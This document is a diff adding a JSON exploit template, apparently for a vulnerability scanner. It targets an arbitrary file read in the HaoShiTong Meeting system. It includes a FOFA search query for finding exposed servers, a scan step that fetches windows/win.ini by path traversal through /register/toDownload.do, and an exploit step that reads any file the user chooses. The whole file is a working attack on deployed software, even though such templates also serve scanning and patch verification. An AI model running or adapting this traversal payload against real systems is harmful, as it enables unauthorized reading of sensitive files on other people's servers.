@@ -1,0 +1,83 @@
+{
+  "Name": "HaoShiTong Meeting system toDownload.do file read",
+  "Description": "There are arbitrary file reading vulnerabilities in the Haoshitong Meeting system, and attackers can obtain sensitive information.",
+  "Product": "HaoShiTong",
+  "Homepage": "http://www.hst.com/",
+  "DisclosureDate": "2021-04-12",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"HaoShiTong-Cloud-Conference\" || app=\"Hanming-Video-Conferencing\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "file",
+      "type": "createSelect",
+      "value": "/windows/win.ini,/Windows/System32/drivers/etc/hosts",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "[extensions]",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../..{{{file}}}"
+      },
+      "SetVariable": ["output|lastbody"]
+    }
+  ],
+  "Tags": ["fileread"],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": ["HaoShiTong-Cloud-Conference"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
